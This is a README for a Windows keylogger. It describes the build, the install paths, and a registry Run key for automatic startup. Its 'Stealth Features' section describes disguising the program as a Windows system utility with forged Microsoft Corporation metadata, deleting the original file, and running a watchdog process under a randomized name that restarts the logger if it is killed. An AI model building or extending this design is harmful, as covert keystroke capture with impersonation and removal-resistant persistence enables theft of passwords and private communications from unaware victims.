# KeyLogger

Simple keylogger for Windows.

## Building

To build the project and get the executable:

```powershell
dotnet build -c Release
```

The executable will be located at `KeyLogger\bin\Release\WinSysUtils.exe`. When run, it will automatically install itself into a standard hidden folder, register for automatic startup, delete the original file, and start a hidden watchdog system (with a randomized numeric name) to ensure it stays running even if closed via Task Manager.

Note: `dotnet publish` is not supported for this .NET Framework 4.8 project because it uses legacy ClickOnce tasks incompatible with the .NET Core MSBuild. Use `dotnet build` instead.

## Installation Details

The application automatically installs itself to the following locations:

- **Executable**: `%LOCALAPPDATA%\WindowsSystemUtility\WinSysUtils.exe`
- **Watchdog**: `%LOCALAPPDATA%\WindowsSystemUtility\[12-digit-random-name].exe`
- **Registry (Startup)**: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` (Value: `WinSysUtils`)

## Stealth Features

- **Identity**: The main application appears as `WinSysUtils.exe` (Windows System Utility) with Microsoft Corporation metadata.
- **Resilience**: Uses a dual-process watchdog mechanism. The watchdog process is randomized (12 digits) to avoid being easily searched or grouped. If the main logger or the watchdog is killed, the other will automatically restart it within seconds.
- **Installation**: Automatically installs to `%LOCALAPPDATA%\WindowsSystemUtility\`.
- **Persistence**: Re-registers itself in the Registry for startup on every execution.

## Uninstallation

To completely remove the keylogger, run the provided uninstaller script as an Administrator:

```powershell
.\KeyLoggerUninstaller.ps1
```

This script will terminate all active processes (including the watchdog), remove the startup registry entry, and delete the installation files.